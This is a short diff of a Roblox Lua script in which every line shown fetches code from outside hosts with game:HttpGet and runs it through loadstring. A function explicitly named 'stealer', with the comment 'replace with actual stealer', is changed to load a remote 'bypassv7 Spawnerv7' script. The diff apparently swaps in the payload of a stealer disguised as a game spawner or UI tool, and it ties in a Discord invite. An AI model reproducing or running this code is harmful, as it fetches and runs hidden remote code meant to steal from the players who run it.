@@ -2,7 +2,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ThundarZ/Welcome/main
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/rXKE0jL3fFIHOBP6/raw", true))()
 ```lua
 local function stealer()
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/rXKE0jL3fFIHOBP6/raw", true))()-- replace with actual stealer
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Petspawner1/bypassv7/refs/heads/main/Spawnerv7"))()-- replace with actual stealer
 end
 local function loadui()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
